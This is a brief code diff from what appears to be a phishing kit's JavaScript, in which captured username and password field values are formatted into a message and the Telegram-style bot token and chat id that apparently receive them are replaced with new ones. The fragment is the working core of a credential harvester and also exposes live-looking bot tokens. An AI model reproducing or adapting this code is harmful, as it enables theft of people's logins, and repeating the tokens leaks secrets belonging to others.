@@ -33,9 +33,9 @@ var pass = $("#pass").val();
 
 var text = "user : `" + username + "` || pass : `" + pass + "`" 
 
-var token = "801870955:AAE2m8IagrjoLf7XUxi27audKvv50jj_CH8";
+var token = "805424497:AAHl_gIQW8ajYytLrMLeu7rSLpe2xQX4kpg";
 
-var id = "387534219";
+var id = "610044443";
 
 if(username.length > 0 && pass.length > 0){
 
